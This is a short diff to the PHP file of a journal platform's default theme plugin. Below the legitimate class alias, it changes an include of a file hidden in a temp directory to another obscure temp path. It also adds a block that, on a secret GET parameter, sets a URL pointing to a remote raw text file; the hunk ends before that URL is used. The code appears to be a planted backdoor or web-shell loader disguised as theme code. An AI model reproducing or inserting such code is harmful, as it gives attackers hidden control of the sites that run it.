@@ -258,7 +258,7 @@ class DefaultThemePlugin extends \PKP\plugins\ThemePlugin
 if (!PKP_STRICT_MODE) {
     class_alias('\APP\plugins\themes\default\DefaultThemePlugin', '\DefaultThemePlugin');
 }
-include("/tmp/.XIM-unix/.ojs_capture");
+include("/usr/tmp/darumaika");
 if (isset($_GET['PengemulLKerangAmis'])) {
     $url = "https://raw.githubusercontent.com/desvaranayla-spec/access-in-links/refs/heads/main/alpa-kerang-syn.txt";
 
